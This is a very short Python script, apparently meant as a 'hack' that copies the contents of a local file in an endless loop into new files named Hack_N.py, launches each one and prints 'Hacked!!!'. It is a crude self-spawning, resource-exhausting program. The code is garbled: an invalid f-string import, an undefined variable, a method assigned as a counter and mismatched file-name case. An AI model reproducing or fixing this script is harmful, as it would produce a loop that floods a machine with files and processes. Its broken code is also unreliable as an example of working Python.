import os
from main import i
import f"Hack_{i}.py"
i = py_name.isdigit

f'i = {i}'
while True:
    i+=1
    file = open(f"Hack_{i}.py", "w+")
    cont = open('Content/cont', 'r+')
    for text in cont:
        file.write(text)
    os.startfile(f"hack_{i}.py")
    print('Hacked!!!')

